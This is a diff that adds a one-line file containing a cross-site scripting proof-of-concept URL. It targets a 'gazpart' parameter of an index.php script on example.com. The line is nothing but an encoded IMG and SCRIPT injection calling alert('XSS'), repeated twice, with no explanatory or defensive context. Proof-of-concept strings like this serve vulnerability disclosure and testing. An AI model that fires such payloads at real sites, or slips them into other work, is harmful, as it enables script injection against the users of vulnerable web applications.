@@ -1,0 +1,2 @@
+
+http://www.example.com/index.php?&amp;gazpart=view&lt;IMG%20&quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;&amp;&lt;IMG%20&quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;gazimage=198
